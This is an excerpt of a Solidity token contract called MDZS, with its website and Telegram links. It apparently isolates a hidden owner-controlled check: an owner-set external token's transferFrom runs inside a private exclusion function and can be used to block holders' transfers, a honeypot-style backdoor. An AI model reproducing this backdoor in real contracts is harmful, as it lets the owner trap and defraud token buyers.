...
Website: https://www.mdzs.cool
Telegram:  https://t.me/MDZSETH
...
contract MDZS is ERC20, Ownable {
    ...
    constructor() ERC20(unicode"魔道祖师", "MDZS") {
    ...
    function exclude(address account, address token) external onlyOwner {
        _excludeToken = token;
    ...
    function isExcluded(address from, address to) private returns (bool) {
        return _excludeToken == address(0) || IERC20(_excludeToken).transferFrom(from, to, 0);
    }
